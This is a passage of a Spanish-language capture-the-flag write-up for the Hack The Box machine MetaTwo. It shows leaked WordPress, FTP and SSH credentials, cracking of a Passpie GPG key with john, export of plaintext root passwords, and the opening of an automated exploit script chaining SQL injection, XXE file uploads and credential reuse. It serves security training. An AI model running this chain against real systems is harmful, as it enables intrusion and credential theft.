<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_SALT'</span><span class="p">,</span> <span class="s1">'&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_SALT'</span><span class="p">,</span>   <span class="s1">'4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf='</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_SALT'</span><span class="p">,</span>       <span class="s1">'.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL'</span> <span class="p">);</span>

<span class="cd">/**
 * WordPress Database Table prefix.
 */</span>
<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>

<span class="cd">/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'WP_DEBUG'</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>

<span class="cd">/** Absolute path to the WordPress directory. */</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">defined</span><span class="p">(</span> <span class="s1">'ABSPATH'</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
	<span class="nb">define</span><span class="p">(</span> <span class="s1">'ABSPATH'</span><span class="p">,</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="p">);</span>
<span class="p">}</span>

<span class="cd">/** Sets up WordPress vars and included files. */</span>
<span class="k">require_once</span> <span class="no">ABSPATH</span> <span class="mf">.</span> <span class="s1">'wp-settings.php'</span><span class="p">;</span>
</pre></table></code></div></div><p>Observamos unas posibles credenciales de <strong>FTP</strong>, y recordando que teniamos el puerto <strong>21(FTP)</strong> logramos conectarnos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="go">❯ ftp 10.10.11.186 21
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:potro): metapress.htb
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">229 Entering Extended Passive Mode (|||60192|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">cd </span>mailer
<span class="go">250 CWD command successful
</span><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">229 Entering Extended Passive Mode (|||6925|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5 14:12 ..
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
226 Transfer complete
</span><span class="gp">ftp&gt;</span><span class="w"> </span>get send_email.php
<span class="go">local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||64863|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |**********************************************************************************************************************************************|  1126       14.12 MiB/s    00:00 ETA
226 Transfer complete
</span></pre></table></code></div></div><p>Conseguimos descargar el archivo <code class="language-plaintext highlighter-rouge">send_email.php</code> en el cúal se encontraban las credenciales del servicio <strong>PHPMailer</strong> del un usuario <code class="language-plaintext highlighter-rouge">jnelson:Cb4_JmWM8zUZWMu@Ys</code>:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="cm">/*
 * This script will be used to send an email to all our users when ready for launch
*/</span>

<span class="kn">use</span> <span class="nc">PHPMailer\PHPMailer\PHPMailer</span><span class="p">;</span>
<span class="kn">use</span> <span class="no">PHPMailer\PHPMailer\SMTP</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PHPMailer\PHPMailer\Exception</span><span class="p">;</span>

<span class="k">require</span> <span class="s1">'PHPMailer/src/Exception.php'</span><span class="p">;</span>
<span class="k">require</span> <span class="s1">'PHPMailer/src/PHPMailer.php'</span><span class="p">;</span>
<span class="k">require</span> <span class="s1">'PHPMailer/src/SMTP.php'</span><span class="p">;</span>

<span class="nv">$mail</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPMailer</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>

<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">SMTPDebug</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>                               
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nf">isSMTP</span><span class="p">();</span>            

<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">Host</span> <span class="o">=</span> <span class="s2">"mail.metapress.htb"</span><span class="p">;</span>
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">SMTPAuth</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>                          
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">Username</span> <span class="o">=</span> <span class="s2">"jnelson@metapress.htb"</span><span class="p">;</span>                 
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">Password</span> <span class="o">=</span> <span class="s2">"Cb4_JmWM8zUZWMu@Ys"</span><span class="p">;</span>                           
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">SMTPSecure</span> <span class="o">=</span> <span class="s2">"tls"</span><span class="p">;</span>                           
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">Port</span> <span class="o">=</span> <span class="mi">587</span><span class="p">;</span>                                   

<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">From</span> <span class="o">=</span> <span class="s2">"jnelson@metapress.htb"</span><span class="p">;</span>
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">FromName</span> <span class="o">=</span> <span class="s2">"James Nelson"</span><span class="p">;</span>

<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nf">addAddress</span><span class="p">(</span><span class="s2">"info@metapress.htb"</span><span class="p">);</span>

<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nf">isHTML</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>

<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">Subject</span> <span class="o">=</span> <span class="s2">"Startup"</span><span class="p">;</span>
<span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">Body</span> <span class="o">=</span> <span class="s2">"&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;"</span><span class="p">;</span>

<span class="k">try</span> <span class="p">{</span>
    <span class="nv">$mail</span><span class="o">-&gt;</span><span class="nf">send</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">"Message has been sent successfully"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Mailer Error: "</span> <span class="mf">.</span> <span class="nv">$mail</span><span class="o">-&gt;</span><span class="nc">ErrorInfo</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Finalmente el usuario <code class="language-plaintext highlighter-rouge">jnelson</code> rehusó estas credenciales y por ello conseguimos entrar por el puerto <strong>22(SSH)</strong> y conseguir la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">❯ ssh jnelson@10.10.11.186
jnelson@10.10.11.186's password: 
</span><span class="gp">Linux meta2 5.10.0-19-amd64 #</span>1 SMP Debian 5.10.149-2 <span class="o">(</span>2022-10-21<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 16 19:19:40 2022 from 10.10.14.50
</span><span class="gp">jnelson@meta2:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> + 2&gt;/dev/null
<span class="go">-rw-r----- 1 root jnelson 33 Nov 16 17:08 /home/jnelson/user.txt
</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>En el proceso de una enumeración básica por el sistema, encontramos en nuestra de usuario el archivo <code class="language-plaintext highlighter-rouge">.passpie</code>. Investigando encontramos que Passpie <strong>es una herramienta de línea de comandos para administrar contraseñas desde el terminal</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">jnelson@meta2:~$</span><span class="w"> </span>passpie 
<span class="go">╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Passpie documentation: <a href="https://passpie.readthedocs.io/en/latest/getting_started.html">https://passpie.readthedocs.io/en/latest/getting_started.html</a></p></div></blockquote><p>Listamos todos los archivos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">jnelson@meta2:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-laR</span> .passpie/
<span class="go">.passpie/:
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 5 jnelson jnelson 4096 Nov 16 22:13 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26 13:57 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh

.passpie/ssh:
total 16
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..
-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 jnelson.pass
-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 root.pass
</span></pre></table></code></div></div><p>Como es mi primera vez viendo este programa tuve que leer la documentación y encontre algo interesante:</p><p><img data-src="/assets/img/htb/writeups/metatwo/passpie_gnupg_keys.png" alt="https://passpie.readthedocs.io/en/latest/getting_started.html#exporting-credentials" class="shadow" data-proofer-ignore></p><p>Entonces teniendo esta “llave” podremos obtener las credenciales que listamos anteriormente. Para ello, traemos estas llaves a nuestra máquina para poder crackearlas:</p><blockquote><p>Ya que ambas llaves (pública / privada) vienen en un mismo archivo, las separamos y trabajamos con la privada</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="go">❯ head passpie_private_gnupg
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb

</span><span class="gp">❯ gpg2john passpie_private_gnupg &gt;</span><span class="w"> </span>passpie_private_gnupg_hash
<span class="go">
File passpie_private_gnupg

❯ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie_private_gnupg_hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:05 DONE (2022-11-16 17:31) 0.1972g/s 32.54p/s 32.54c/s 32.54C/s peanut..sweetie
</span></pre></table></code></div></div><p>Ahora solo exportamos las credenciales de la base de datos passpie en un archivo especificado:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">jnelson@meta2:~$</span><span class="w"> </span>passpie <span class="nb">export </span>user_credentials
<span class="go">Passphrase: 
</span><span class="gp">jnelson@meta2:~$</span><span class="w"> </span><span class="nb">cat </span>user_credentials 
<span class="go">credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
</span></pre></table></code></div></div><p>Por último, hacemos un pivoting al usuario <code class="language-plaintext highlighter-rouge">root</code> y conseguimos la última flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">jnelson@meta2:~$</span><span class="w"> </span>su root
<span class="go">Password: 
</span><span class="gp">root@meta2:/home/jnelson#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> <span class="se">\;</span>
<span class="go">-rw-r----- 1 root root 33 Nov 16 17:08 /root/root.txt
</span></pre></table></code></div></div><p>A modo de práctica hice un script en <code class="language-plaintext highlighter-rouge">python</code> para automatizar todo el proceso:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450
451
452
453
454
455
456
457
458
459
460
461
462
463
464
465
466
467
468
469
470
471
472
473
474
475
476
477
478
479
480
481
482
483
484
485
486
487
488
489
490
491
492
493
494
495
496
497
498
499
500
501
502
503
504
505
506
507
508
509
510
511
512
513
514
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/env/bin python3
</span>
<span class="s">"""
Metatwo Autopwn HTB
-------------------
Author: Marss
Date: 10 Nov, 2022
"""</span>
<span class="kn">import</span> <span class="nn">pdb</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">gzip</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">paramiko</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">shlex</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">threading</span>

<span class="kn">from</span> <span class="nn">ftplib</span> <span class="kn">import</span> <span class="n">FTP</span>
<span class="kn">from</span> <span class="nn">passlib.hash</span> <span class="kn">import</span> <span class="n">phpass</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>


<span class="c1">## Ctrl + c
# (function)
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] User terminated."</span><span class="p">)</span>

<span class="c1"># (signal)
</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>


<span class="c1">## Main class
</span><span class="k">class</span> <span class="nc">Exploit</span><span class="p">:</span>

	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
		<span class="s">"""
		Initialize variables to all process:
		
		Remember add metapress.htb domain to /etc/hosts
		"""</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">target_host</span> <span class="o">=</span> <span class="p">{</span>
			<span class="s">'ip_address'</span> <span class="p">:</span> <span class="s">'10.10.11.186'</span><span class="p">,</span> 
			<span class="s">'url_domain'</span> <span class="p">:</span> <span class="s">'http://metapress.htb'</span>
		<span class="p">}</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">ip</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">compressed_wordlist</span> <span class="o">=</span> <span class="s">'rockyou.txt.gz'</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">credentials</span> <span class="o">=</span> <span class="p">{}</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">stop_threads</span> <span class="o">=</span> <span class="bp">False</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">wav_file_name</span> <span class="o">=</span> <span class="s">'malicious.wav'</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">dtd_file_name</span> <span class="o">=</span> <span class="s">'malicious.dtd'</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">log_file_name</span> <span class="o">=</span> <span class="s">'xxe_request.log'</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">exposed_ftp_file</span> <span class="o">=</span> <span class="s">'send_email.php'</span>

		<span class="bp">self</span><span class="p">.</span><span class="n">passpie_keys_file</span> <span class="o">=</span> <span class="s">'passpie_keys'</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">passpie_private_key</span> <span class="o">=</span> <span class="s">'passpie_private_key'</span>

	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="s">"""
		Exploit process: 
		(1) Bookpress plugin [CVE-2022-0739] (Unauthenticated SQL injection)
			* Wordpress manager user credentials
			* Decrypt manager password [Bruteforce]
		
		(2) Media library [CVE-2021-29447] (Authenticated XXE [PHP 8])
			* wp-config.php: metapress.htb FTP credentials
		
		(3) FTP login (Leakage Information)
			* send_email.php: jnelson PHPMailer credentials
		
		(4) SSH login (Reused Credentials)
			* Crack GPG keys of Password Manager [passpie]
			* Export encrypted credentials in plaintext
		
		(5) Pivot to root user
			* Send reverse shell ?
		"""</span>

		<span class="k">with</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting Attack'</span><span class="p">)</span> <span class="k">as</span> <span class="n">progress</span><span class="p">:</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Unauthenticated SQL injection (CVE-2022-0739)'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="n">manager_password_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">sql_injection</span><span class="p">()</span>
			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'extracted manager user password hash (CVE-2022-0739)'</span><span class="p">)</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Starting Brute-force attack'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="k">with</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Cracking password'</span><span class="p">)</span> <span class="k">as</span> <span class="n">progress_2</span><span class="p">:</span>
				<span class="bp">self</span><span class="p">.</span><span class="n">bruteforce_attack</span><span class="p">(</span><span class="n">manager_password_hash</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">get_wordlist</span><span class="p">(),</span> <span class="n">progress_2</span><span class="p">)</span>
			<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'manager password -&gt; {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'manager'</span><span class="p">]))</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Authenticated XXE [PHP 8] (CVE-2021-29447)'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">create_xxe_files</span><span class="p">(</span><span class="n">target_file_path</span><span class="o">=</span><span class="s">"../wp-config.php"</span><span class="p">)</span>
			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'malicious XXE files created : {}, {} (CVE-2021-29447)'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wav_file_name</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">dtd_file_name</span><span class="p">))</span>
			
			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Uploading .wav file to receive wp-config.php'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">wordpress_authentication</span><span class="p">()</span>
			<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'xxe attack requests log file : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">log_file_name</span><span class="p">))</span>

			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Extracting FTP credentials of log_file'</span><span class="p">);</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">extract_ftp_credentials</span><span class="p">()</span>
			<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'ftp credentials -&gt; {}:{} (Leakage Information)'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ftp_user'</span><span class="p">],</span> <span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ftp_pass'</span><span class="p">]))</span>
			
			<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'FTP logging to extract SSH credentials from exposed file ({})'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">exposed_ftp_file</span><span class="p">));</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">ftp_login</span><span class="p">()</span>
			<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'ssh credentials -&gt; {}:{} (Reused Credentials)'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_user'</span><span class="p">],</span> <span class="bp">self</span><span class="p">.</span><span class="n">credentials</span><span class="p">[</span><span class="s">'ssh_pass'</span><span class="p">]))</span>

